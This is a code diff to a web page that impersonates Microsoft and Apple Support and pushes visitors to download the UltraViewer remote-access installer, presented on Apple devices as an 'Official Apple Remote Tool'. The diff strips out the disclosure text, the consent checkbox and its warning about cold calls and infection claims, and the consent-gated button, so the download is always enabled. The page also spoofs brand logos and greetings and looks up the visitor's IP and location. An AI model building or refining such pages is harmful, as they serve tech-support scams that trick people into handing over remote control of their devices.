@@ -204,64 +204,6 @@
             padding: 20px;
         }
 
-        /* ---------- Notice / disclosure ---------- */
-        .ms-notice {
-            background: #f8fafc;
-            border-left: 4px solid var(--brand-color);
-            padding: 12px 16px;
-            margin-bottom: 16px;
-            border-radius: 4px;
-        }
-        .ms-notice b {
-            display: block;
-            font-weight: 600;
-        }
-        .ms-notice small {
-            color: #3b3b3b;
-            font-size: 13px;
-        }
-
-        .ms-disclose {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            display: grid;
-            gap: 12px;
-        }
-        .ms-disclose li {
-            display: flex;
-            gap: 12px;
-            align-items: flex-start;
-            padding: 12px 14px;
-            border: 1px solid #e8e8e8;
-            border-radius: 4px;
-            background: #fafafa;
-        }
-        .ms-disclose .ms-ic {
-            width: 28px;
-            height: 28px;
-            flex-shrink: 0;
-            color: var(--brand-color);
-        }
-        .ms-disclose .ms-ic svg {
-            width: 100%;
-            height: 100%;
-            fill: none;
-            stroke: currentColor;
-            stroke-width: 2.2;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-        }
-        .ms-disclose b {
-            display: block;
-            font-weight: 600;
-            font-size: 14px;
-        }
-        .ms-disclose small {
-            font-size: 13px;
-            color: #3b3b3b;
-        }
-
         /* ---------- Connection info ---------- */
         .ms-info-grid {
             display: grid;
@@ -311,42 +253,7 @@
         }
         .ms-info-error[hidden] { display: none; }
 
-        .ms-info-note {
-            margin-top: 14px;
-            font-size: 13px;
-            color: #5e5e5e;
-            line-height: 1.5;
-        }
-
-        /* ---------- Consent ---------- */
-        .ms-consent {
-            display: flex;
-            gap: 12px;
-            padding: 14px 16px;
-            background: #f8fafc;
-            border: 1px solid #e0e0e0;
-            border-radius: 4px;
-        }
-        .ms-consent input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            accent-color: var(--brand-color);
-            cursor: pointer;
-            flex-shrink: 0;
-            margin-top: 2px;
-        }
-        .ms-consent label {
-            font-size: 14px;
-            color: #1e1e1e;
-            cursor: pointer;
-        }
-        .ms-consent label small {
-            display: block;
-            color: #5e5e5e;
-            font-size: 13px;
-            margin-top: 2px;
-        }
-
+        /* ---------- CTA row ---------- */
         .ms-cta-row {
             display: flex;
             align-items: center;
@@ -383,16 +290,6 @@
             background: var(--brand-hover);
             border-color: var(--brand-hover);
             text-decoration: none;
-        }
-        .ms-btn-primary:disabled {
-            background: #b3b3b3;
-            border-color: #b3b3b3;
-            color: #ffffff;
-            cursor: not-allowed;
-            opacity: 1;
-        }
-        .ms-btn-primary:disabled:hover {
-            background: #b3b3b3;
         }
         .ms-btn-secondary {
             background: transparent;
@@ -500,46 +397,6 @@
             </div>
         </section>
 
-        <!-- Before you continue -->
-        <div class="ms-card">
-            <div class="ms-card-header">
-                <h3>Before you continue — what to know</h3>
-                <span class="ms-side">Please read</span>
-            </div>
-            <div class="ms-card-body">
-                <div class="ms-notice">
-                    <b>Remote access requires your permission</b>
-                    <small id="noticeSmall">Even after UltraViewer is installed, no one can view or control your device until you personally give the agent your session ID and password. You can end the session at any time.</small>
-                </div>
-
-                <ul class="ms-disclose">
-                    <li>
-                        <span class="ms-ic" aria-hidden="true">
-                            <svg viewBox="0 0 24 24">
-                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-                            </svg>
-                        </span>
-                        <div>
-                            <b id="discloseTitle">UltraViewer is a separate third‑party tool</b>
-                            <small id="discloseSmall">Clicking “Start remote session” will download the UltraViewer installer (<a href="https://www.ultraviewer.net/en/UltraViewer_setup_6.6_en.exe" target="_blank" rel="noopener">.exe</a>). Their software and terms are governed by their vendor.</small>
-                        </div>
-                    </li>
-                    <li>
-                        <span class="ms-ic" aria-hidden="true">
-                            <svg viewBox="0 0 24 24">
-                                <rect x="3" y="11" width="18" height="10" rx="2" />
-                                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
-                            </svg>
-                        </span>
-                        <div>
-                            <b id="discloseCollect">Nothing is collected unless you choose to show it</b>
-                            <small id="discloseCollectSmall">The connection info below (IP, approximate location, ISP, browser) is fetched automatically when you load the page. It is displayed only to you and is not sent to Microsoft.</small>
-                        </div>
-                    </li>
-                </ul>
-            </div>
-        </div>
-
         <!-- Your connection info (auto-load) -->
         <div class="ms-card">
             <div class="ms-card-header">
@@ -563,27 +420,16 @@
                 </div>
 
                 <div class="ms-info-error" id="infoError" hidden></div>
-
-                <div class="ms-info-note">
-                    Location is approximate (derived from your IP by <a href="https://ipinfo.io" target="_blank" rel="noopener">ipinfo.io</a>) and can be off by tens of kilometres. Browser info is parsed from your own user‑agent locally. None of this data is transmitted — it is shown only to you.
-                </div>
             </div>
         </div>
 
-        <!-- Consent & continue -->
+        <!-- Start remote session (no consent) -->
         <div class="ms-card">
             <div class="ms-card-header">
-                <h3>Consent &amp; continue</h3>
+                <h3 id="ctaCardTitle">Start remote session</h3>
+                <span class="ms-side">Choose your tool</span>
             </div>
             <div class="ms-card-body">
-                <div class="ms-consent">
-                    <input type="checkbox" id="consent">
-                    <label for="consent" id="consentLabel">
-                        I understand that clicking “Start remote session” will download the UltraViewer installer, and that remote access to my device will only occur if I personally share my session ID and password with a Microsoft Technician.
-                        <small>I am doing this voluntarily. I was not pressured, called out of the blue, or told my device was infected as a reason to be on this page.</small>
-                    </label>
-                </div>
-
                 <!-- Dynamic CTA container -->
                 <div class="ms-cta-row" id="ctaContainer">
                     <!-- Content rendered by JavaScript -->
@@ -605,7 +451,7 @@
             return /Mac OS X/.test(ua) || /iPhone|iPad|iPod/.test(ua);
         }
 
-        // --- Render CTAs based on platform ---
+        // --- Render CTAs based on platform (always enabled) ---
         function renderCTAs(isApple) {
             const container = document.getElementById('ctaContainer');
             if (isApple) {
@@ -618,59 +464,21 @@
                 `;
             } else {
                 container.innerHTML = `
-                    <a id="continueBtn" class="ms-btn ms-btn-primary" href="https://www.ultraviewer.net/en/UltraViewer_setup_6.6_en.exe" target="_blank" rel="noopener" aria-disabled="true" tabindex="-1" style="pointer-events: none; opacity: 0.55;">
-                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M14 3h7v7" />
-                            <path d="M10 14 21 3" />
-                            <path d="M21 14v5a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5" />
-                        </svg>
-                        <span id="startBtnText">Start remote session</span>
-                    </a>
+                    <a href="https://www.ultraviewer.net/en/UltraViewer_setup_6.6_en.exe" class="ms-btn ms-btn-primary" target="_blank" rel="noopener">Start remote session</a>
                     <span class="ms-cta-help">Downloads the UltraViewer installer (.exe).</span>
                 `;
             }
-            // Re-bind consent logic
-            bindConsentLogic();
-        }
-
-        // --- Consent gating logic ---
-        function bindConsentLogic() {
-            const consentEl = document.getElementById('consent');
-            const buttons = document.querySelectorAll('#ctaContainer .ms-btn-primary');
-
-            function updateButtons() {
-                const enabled = consentEl.checked;
-                buttons.forEach(btn => {
-                    btn.setAttribute('aria-disabled', String(!enabled));
-                    if (enabled) {
-                        btn.removeAttribute('tabindex');
-                        btn.style.pointerEvents = '';
-                        btn.style.opacity = '';
-                    } else {
-                        btn.setAttribute('tabindex', '-1');
-                        btn.style.pointerEvents = 'none';
-                        btn.style.opacity = '.55';
-                    }
-                });
-            }
-
-            // Remove old listener and attach new one
-            consentEl.removeEventListener('change', updateButtons);
-            consentEl.addEventListener('change', updateButtons);
-            // Initial state
-            updateButtons();
         }
 
         // --- Apply Apple UI (branding, text, CTAs) ---
         function applyAppleUI() {
-            // Add class to body for CSS overrides
             document.body.classList.add('apple');
 
-            // Update favicon to a proper Apple logo
+            // Update favicon to proper Apple logo
             const favicon = document.getElementById('favicon');
             favicon.href = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M16.203 9.194c-1.264 0-3.22-1.437-5.28-1.387-2.72.053-5.213 1.579-6.613 4.009-2.827 4.893-1.52 12.107 2.027 16.107 1.347 1.52 2.947 3.213 5.04 3.147 2.027-.067 2.8-1.307 5.253-1.307 2.453 0 3.16 1.307 5.253 1.253 2.173-.04 3.547-1.547 4.893-3.067 1.52-1.693 2.147-3.333 2.173-3.413-.067-.027-4.187-1.613-4.227-6.387-.04-4.013 3.267-5.92 3.427-6.027-1.88-2.773-4.773-3.08-5.787-3.133-2.36-.107-4.32 1.28-5.44 1.28zm4.787-4.467c1.12-1.36 1.88-3.24 1.667-5.12-1.613.067-3.573 1.08-4.72 2.44-1.027 1.227-1.933 3.173-1.693 5.04 1.787.133 3.613-.96 4.746-2.36z' fill='%23000000'/%3E%3C/svg%3E";
 
-            // Update logo to a proper Apple logo
+            // Update logo to proper Apple logo
             const logoContainer = document.getElementById('brandLogo');
             logoContainer.innerHTML = `
                 <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
@@ -678,37 +486,21 @@
                 </svg>
             `;
 
-            // Update brand name
             document.getElementById('brandName').textContent = 'Apple';
 
-            // Update page title & meta description
             document.getElementById('pageTitle').textContent = 'Apple Support — Start a Remote Support Session';
             document.getElementById('pageDesc').content = 'Remote-support connection page for Apple customers. Review what will be shared, then start a remote support session using Official Apple Remote Tool.';
 
-            // Hero
             document.getElementById('heroTitle').textContent = 'Start a remote support session with an Apple Technician.';
             document.getElementById('heroLede').innerHTML = 'This page helps you connect to Apple Technicians using <strong>Official Apple Remote Tool</strong>, a third‑party remote‑support tool. Please read what will happen and what is collected, then choose whether to continue. You can leave this page at any time.';
 
-            // Static greeting text
             document.getElementById('greetingText').textContent = '“This is Apple Support. You are connected to one of our certified technicians.”';
 
-            // Notice (the blue-bordered box)
-            document.getElementById('noticeSmall').textContent = 'Even after Official Apple Remote Tool is installed, no one can view or control your device until you personally give the agent your session ID and password. You can end the session at any time.';
+            // Update the card title (optional – keep as "Start remote session")
+            // Already set in HTML, no change needed.
 
-            // Disclose list - update UltraViewer references
-            document.getElementById('discloseTitle').textContent = 'Official Apple Remote Tool is a separate third‑party tool';
-            document.getElementById('discloseSmall').innerHTML = 'Clicking “Start remote session HTD” or “Start remote session Alpemix” will open the official download page. Their software and terms are governed by their respective vendors.';
-
-            // Disclose collect - change Microsoft to Apple
-            document.getElementById('discloseCollectSmall').textContent = 'The connection info below (IP, approximate location, ISP, browser) is fetched automatically when you load the page. It is displayed only to you and is not sent to Apple.';
-
-            // Consent label
-            document.getElementById('consentLabel').innerHTML = `I understand that clicking “Start remote session HTD” or “Start remote session Alpemix” will open the official Apple remote tool download page, and that remote access to my device will only occur if I personally share my session ID and password with an Apple Technician. <small>I am doing this voluntarily. I was not pressured, called out of the blue, or told my device was infected as a reason to be on this page.</small>`;
-
-            // Footer
             document.getElementById('footerLine').innerHTML = document.getElementById('footerLine').innerHTML.replace(/Microsoft/g, 'Apple');
 
-            // Render Apple CTAs
             renderCTAs(true);
         }
 
@@ -750,7 +542,6 @@
             infoStat.textContent = "loading…";
             setCell("cell-browser", parseUserAgent());
 
-            // Try ipinfo.io first, fallback to ip-api.com
             const services = [
                 { url: "https://ipinfo.io/json", parser: (d) => ({ ip: d.ip, loc: [d.city, d.region, d.country].filter(Boolean).join(", "), isp: d.org }) },
                 { url: "https://ip-api.com/json/", parser: (d) => ({ ip: d.query, loc: [d.city, d.regionName, d.country].filter(Boolean).join(", "), isp: d.isp || d.org }) }
@@ -760,7 +551,7 @@
             for (const svc of services) {
                 try {
                     const controller = new AbortController();
-                    const timeout = setTimeout(() => controller.abort(), 5000); // 5s timeout
+                    const timeout = setTimeout(() => controller.abort(), 5000);
                     const r = await fetch(svc.url, { signal: controller.signal, cache: "no-store" });
                     clearTimeout(timeout);
                     if (!r.ok) continue;
@@ -775,9 +566,7 @@
                         success = true;
                         break;
                     }
-                } catch (e) {
-                    // continue to next service
-                }
+                } catch (e) { /* continue */ }
             }
 
             if (!success) {
@@ -793,10 +582,8 @@
             if (isApple) {
                 applyAppleUI();
             } else {
-                // Windows / default
                 renderCTAs(false);
             }
-            // Load connection info
             document.addEventListener("DOMContentLoaded", loadInfo);
         })();
     </script>
